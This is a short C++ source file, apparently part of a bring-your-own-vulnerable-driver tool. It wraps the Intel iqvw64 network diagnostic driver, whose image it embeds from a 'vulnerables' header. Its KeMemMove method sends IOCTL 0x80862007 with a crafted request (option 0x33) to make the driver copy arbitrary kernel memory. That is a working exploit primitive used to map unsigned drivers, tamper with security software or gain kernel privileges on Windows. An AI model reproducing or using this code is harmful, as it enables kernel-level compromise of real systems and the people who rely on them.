#include "iqvw64_driver.hpp"

#include <print>
#include <vulnerables/iqvw64_data.hpp>

Iqvw64Driver::Iqvw64Driver(std::string_view symbLink)
    : BasicVulnDriver(std::move(symbLink))
{
}

const std::vector<uint8_t>& Iqvw64Driver::GetData() const
{
    return iqvw64_data;
}

bool Iqvw64Driver::KeMemMove(uintptr_t dist, uintptr_t src, std::size_t size)
{
    struct CopyMemoryRequest {
        char option;
        char pad0[0xF];
        uintptr_t src;
        uintptr_t dist;
        std::size_t size;
    };

    static_assert(sizeof(CopyMemoryRequest) == 0x28);
    static_assert(offsetof(CopyMemoryRequest, src) == 0x10);

    CopyMemoryRequest request = { 0 };
    request.option = 0x33;
    request.src = src;
    request.dist = dist;
    request.size = size;

    DWORD bytesReturned = 0;
    if (!DeviceIoControl(hDevice, 0x80862007, &request, sizeof(request), nullptr, 0, &bytesReturned, nullptr)) {
        std::println("DeviceIoControl failed: 0x{:X}, bytes returned: {}", GetLastError(), bytesReturned);
        return false;
    }

    return true;
}
